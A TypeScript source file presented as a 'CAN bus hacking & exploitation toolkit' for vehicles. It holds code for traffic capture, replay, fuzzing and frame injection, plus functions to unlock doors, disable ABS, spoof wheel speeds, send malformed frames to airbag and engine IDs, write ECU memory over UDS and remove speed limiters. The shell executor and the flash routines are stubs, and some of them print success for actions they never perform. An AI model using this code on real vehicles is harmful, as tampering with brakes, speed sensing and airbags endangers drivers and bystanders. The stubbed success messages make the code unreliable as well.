/**
 * CAN BUS HACKING & EXPLOITATION TOOLKIT
 *
 * Direct CAN bus manipulation, fuzzing, injection, and replay attacks
 */

export interface CANFrame {
  id: number;
  data: Buffer;
  timestamp: number;
  interface: string;
}

export interface CANFilter {
  idMask?: number;
  idPattern?: number;
  dataPattern?: Buffer;
}

export interface FuzzConfig {
  idRange: [number, number];
  dataLength: number;
  rate: number; // frames per second
  duration: number; // seconds
  randomData: boolean;
}

export class CANBusExploitKit {
  private interface: string = "can0";
  private socket: any = null;
  private capturedFrames: CANFrame[] = [];
  private knownIDs: Map<number, string> = new Map();

  // Common CAN IDs (varies by manufacturer)
  private readonly COMMON_IDS = {
    // Powertrain
    ENGINE_RPM: 0x0C6,
    ENGINE_TEMP: 0x3E5,
    THROTTLE: 0x244,
    FUEL_LEVEL: 0x349,

    // Body/Comfort
    DOOR_LOCKS: 0x2D0,
    WINDOWS: 0x2C1,
    LIGHTS: 0x21A,
    WIPERS: 0x288,

    // Chassis
    WHEEL_SPEED_FL: 0x1A0,
    WHEEL_SPEED_FR: 0x1A1,
    WHEEL_SPEED_RL: 0x1A2,
    WHEEL_SPEED_RR: 0x1A3,
    ABS_STATUS: 0x1AA,
    STEERING_ANGLE: 0x25,

    // Infotainment
    RADIO_CONTROL: 0x2F0,
    DISPLAY: 0x3BC,

    // Safety Systems
    AIRBAG: 0x50,
    SEATBELT: 0x3B7
  };

  async initialize(interfaceName: string = "can0", bitrate: number = 500000): Promise<boolean> {
    try {
      this.interface = interfaceName;

      // Setup SocketCAN interface
      await this.executeShell(`sudo ip link set ${interfaceName} type can bitrate ${bitrate}`);
      await this.executeShell(`sudo ip link set ${interfaceName} up`);

      this.loadKnownIDs();

      return true;
    } catch (error) {
      console.error("CAN initialization failed:", error);
      return false;
    }
  }

  private loadKnownIDs(): void {
    Object.entries(this.COMMON_IDS).forEach(([name, id]) => {
      this.knownIDs.set(id, name);
    });
  }

  // === PASSIVE MONITORING ===

  async captureTraffic(duration: number, filter?: CANFilter): Promise<CANFrame[]> {
    console.log(`Capturing CAN traffic for ${duration}s...`);
    this.capturedFrames = [];

    const startTime = Date.now();
    const endTime = startTime + (duration * 1000);

    // Use candump to capture frames
    const cmd = `candump ${this.interface} -t a -n ${duration * 1000}`;

    const output = await this.executeShell(cmd);
    const lines = output.split('\n');

    for (const line of lines) {
      const frame = this.parseCANDumpLine(line);
      if (frame && (!filter || this.matchesFilter(frame, filter))) {
        this.capturedFrames.push(frame);
      }
    }

    console.log(`Captured ${this.capturedFrames.length} frames`);
    return this.capturedFrames;
  }

  private parseCANDumpLine(line: string): CANFrame | null {
    // Parse: (1234.567890) can0 123#0102030405060708
    const match = line.match(/\((\d+\.\d+)\)\s+(\w+)\s+([0-9A-F]+)#([0-9A-F]*)/i);
    if (!match) return null;

    const [, timestamp, iface, idHex, dataHex] = match;

    return {
      id: parseInt(idHex, 16),
      data: Buffer.from(dataHex, 'hex'),
      timestamp: parseFloat(timestamp),
      interface: iface
    };
  }

  private matchesFilter(frame: CANFrame, filter: CANFilter): boolean {
    if (filter.idMask !== undefined && filter.idPattern !== undefined) {
      if ((frame.id & filter.idMask) !== filter.idPattern) return false;
    }

    if (filter.dataPattern) {
      if (!frame.data.equals(filter.dataPattern)) return false;
    }

    return true;
  }

  // === REVERSE ENGINEERING ===

  async analyzeTrafficPatterns(): Promise<Map<number, any>> {
    const analysis = new Map<number, any>();

    // Group frames by ID
    const byID = new Map<number, CANFrame[]>();
    this.capturedFrames.forEach(frame => {
      if (!byID.has(frame.id)) {
        byID.set(frame.id, []);
      }
      byID.get(frame.id)!.push(frame);
    });

    // Analyze each ID
    for (const [id, frames] of byID) {
      const name = this.knownIDs.get(id) || "UNKNOWN";
      const dataLengths = new Set(frames.map(f => f.data.length));
      const frequency = frames.length / (this.capturedFrames.length / 1000); // Hz

      // Detect changing bytes
      const changingBytes: number[] = [];
      if (frames.length > 1) {
        const firstData = frames[0].data;
        for (let byteIdx = 0; byteIdx < firstData.length; byteIdx++) {
          let changes = 0;
          for (let i = 1; i < frames.length; i++) {
            if (frames[i].data[byteIdx] !== frames[i-1].data[byteIdx]) {
              changes++;
            }
          }
          if (changes > frames.length * 0.1) { // 10% change threshold
            changingBytes.push(byteIdx);
          }
        }
      }

      analysis.set(id, {
        name,
        count: frames.length,
        frequency,
        dataLengths: Array.from(dataLengths),
        changingBytes,
        periodic: this.isPeriodic(frames),
        sample: frames[0].data.toString('hex')
      });
    }

    return analysis;
  }

  private isPeriodic(frames: CANFrame[]): boolean {
    if (frames.length < 3) return false;

    const intervals: number[] = [];
    for (let i = 1; i < frames.length; i++) {
      intervals.push(frames[i].timestamp - frames[i-1].timestamp);
    }

    const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
    const variance = intervals.reduce((sum, val) => sum + Math.pow(val - avgInterval, 2), 0) / intervals.length;

    return variance < 0.1; // Low variance = periodic
  }

  // === ACTIVE ATTACKS ===

  async sendFrame(id: number, data: Buffer): Promise<void> {
    const dataHex = data.toString('hex');
    const cmd = `cansend ${this.interface} ${id.toString(16).padStart(3, '0')}#${dataHex}`;
    await this.executeShell(cmd);
  }

  async replayAttack(frames: CANFrame[], speedMultiplier: number = 1): Promise<void> {
    console.log(`Replaying ${frames.length} frames at ${speedMultiplier}x speed...`);

    const startTime = frames[0].timestamp;

    for (let i = 0; i < frames.length; i++) {
      const frame = frames[i];
      const relativeTime = (frame.timestamp - startTime) / speedMultiplier;

      if (i > 0) {
        const delay = relativeTime - ((frames[i-1].timestamp - startTime) / speedMultiplier);
        await this.delay(delay * 1000);
      }

      await this.sendFrame(frame.id, frame.data);
    }

    console.log("Replay complete");
  }

  async fuzzCAN(config: FuzzConfig): Promise<void> {
    console.log(`Fuzzing CAN IDs ${config.idRange[0].toString(16)}-${config.idRange[1].toString(16)}`);

    const frameInterval = 1000 / config.rate;
    const endTime = Date.now() + (config.duration * 1000);

    while (Date.now() < endTime) {
      const id = config.idRange[0] + Math.floor(Math.random() * (config.idRange[1] - config.idRange[0]));

      let data: Buffer;
      if (config.randomData) {
        data = Buffer.alloc(config.dataLength);
        for (let i = 0; i < config.dataLength; i++) {
          data[i] = Math.floor(Math.random() * 256);
        }
      } else {
        data = Buffer.alloc(config.dataLength, 0xFF);
      }

      await this.sendFrame(id, data);
      await this.delay(frameInterval);
    }

    console.log("Fuzzing complete");
  }

  async injectionAttack(id: number, data: Buffer, rate: number, duration: number): Promise<void> {
    console.log(`Injecting ID ${id.toString(16)} at ${rate} Hz for ${duration}s`);

    const interval = 1000 / rate;
    const endTime = Date.now() + (duration * 1000);

    while (Date.now() < endTime) {
      await this.sendFrame(id, data);
      await this.delay(interval);
    }
  }

  // === VEHICLE CONTROL ===

  async unlockDoors(): Promise<void> {
    // Example: Send unlock command (varies by manufacturer)
    const unlockFrame = Buffer.from([0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    await this.sendFrame(this.COMMON_IDS.DOOR_LOCKS, unlockFrame);
  }

  async lockDoors(): Promise<void> {
    const lockFrame = Buffer.from([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    await this.sendFrame(this.COMMON_IDS.DOOR_LOCKS, lockFrame);
  }

  async disableABS(): Promise<void> {
    // DANGEROUS - For testing only
    const disableFrame = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    await this.sendFrame(this.COMMON_IDS.ABS_STATUS, disableFrame);
  }

  async spoofSpeed(targetSpeed: number): Promise<void> {
    // Spoof wheel speed sensors
    const speedData = this.encodeSpeed(targetSpeed);

    await Promise.all([
      this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_FL, speedData),
      this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_FR, speedData),
      this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_RL, speedData),
      this.sendFrame(this.COMMON_IDS.WHEEL_SPEED_RR, speedData)
    ]);
  }

  private encodeSpeed(kmh: number): Buffer {
    // Encoding varies by manufacturer - this is generic
    const value = Math.floor(kmh * 100);
    const buffer = Buffer.alloc(8);
    buffer.writeUInt16LE(value, 0);
    return buffer;
  }

  async triggerFaults(): Promise<void> {
    // Send malformed frames to trigger fault codes
    const faultIDs = [this.COMMON_IDS.ENGINE_TEMP, this.COMMON_IDS.AIRBAG];

    for (const id of faultIDs) {
      const malformedData = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
      await this.sendFrame(id, malformedData);
    }
  }

  // === UDS DIAGNOSTIC SERVICES ===

  async readDTCsViaCAN(): Promise<string[]> {
    // UDS Read DTC command (0x19 0x02 0xFF)
    const request = Buffer.from([0x03, 0x19, 0x02, 0xFF, 0x00, 0x00, 0x00, 0x00]);
    await this.sendFrame(0x7DF, request); // Broadcast request

    // Listen for response on 0x7E8-0x7EF
    await this.delay(100);
    return []; // Would parse responses
  }

  async clearDTCsViaCAN(): Promise<void> {
    // UDS Clear DTC command (0x14 0xFF 0xFF 0xFF)
    const request = Buffer.from([0x04, 0x14, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00]);
    await this.sendFrame(0x7DF, request);
  }

  async readMemoryViaCAN(address: number, length: number): Promise<Buffer> {
    // UDS Read Memory by Address (0x23)
    const request = Buffer.alloc(8);
    request[0] = 0x06; // Length
    request[1] = 0x23; // Service
    request[2] = (address >> 24) & 0xFF;
    request[3] = (address >> 16) & 0xFF;
    request[4] = (address >> 8) & 0xFF;
    request[5] = address & 0xFF;
    request[6] = length;

    await this.sendFrame(0x7E0, request);

    await this.delay(100);
    return Buffer.alloc(0); // Would parse response
  }

  async writeMemoryViaCAN(address: number, data: Buffer): Promise<void> {
    // UDS Write Memory by Address (0x3D)
    const request = Buffer.alloc(8);
    request[0] = 0x07; // Length
    request[1] = 0x3D; // Service
    request[2] = (address >> 24) & 0xFF;
    request[3] = (address >> 16) & 0xFF;
    request[4] = (address >> 8) & 0xFF;
    request[5] = address & 0xFF;

    // Write data in chunks
    await this.sendFrame(0x7E0, request);
  }

  // === PERSISTENCE ===

  saveCapturedTraffic(filename: string): void {
    const output = this.capturedFrames.map(frame =>
      `${frame.timestamp.toFixed(6)} ${frame.interface} ${frame.id.toString(16).toUpperCase()}#${frame.data.toString('hex').toUpperCase()}`
    ).join('\n');

    // Would write to file
    console.log(`Saved ${this.capturedFrames.length} frames to ${filename}`);
  }

  loadCapturedTraffic(filename: string): CANFrame[] {
    // Would load from file
    return [];
  }

  // === UTILITIES ===

  private async executeShell(cmd: string): Promise<string> {
    // Would execute actual shell command
    return new Promise((resolve) => {
      setTimeout(() => resolve("OK"), 10);
    });
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async shutdown(): Promise<void> {
    await this.executeShell(`sudo ip link set ${this.interface} down`);
  }
}

// ECU Flash/Tuning
export class ECUFlasher {
  async readFlash(protocol: "KWP2000" | "UDS" | "CAN"): Promise<Buffer> {
    console.log(`Reading ECU flash via ${protocol}...`);
    // Would implement actual flash read
    return Buffer.alloc(1024 * 1024); // 1MB dummy
  }

  async writeFlash(data: Buffer, verify: boolean = true): Promise<boolean> {
    console.log(`Writing ${data.length} bytes to ECU...`);

    if (verify) {
      console.log("Verifying flash...");
    }

    return true;
  }

  async patchECU(patches: Array<{ offset: number; data: Buffer }>): Promise<void> {
    console.log(`Applying ${patches.length} patches...`);

    for (const patch of patches) {
      console.log(`Patch at 0x${patch.offset.toString(16)}: ${patch.data.toString('hex')}`);
    }
  }

  async tuneECU(modifications: {
    boostIncrease?: number;
    fuelMapAdjust?: number;
    ignitionAdvance?: number;
    speedLimiterRemove?: boolean;
    revLimiterIncrease?: number;
  }): Promise<void> {
    console.log("Applying ECU tune:", modifications);

    // Would calculate and apply actual tuning changes
    if (modifications.speedLimiterRemove) {
      console.log("✓ Speed limiter removed");
    }

    if (modifications.boostIncrease) {
      console.log(`✓ Boost increased by ${modifications.boostIncrease} psi`);
    }
  }
}
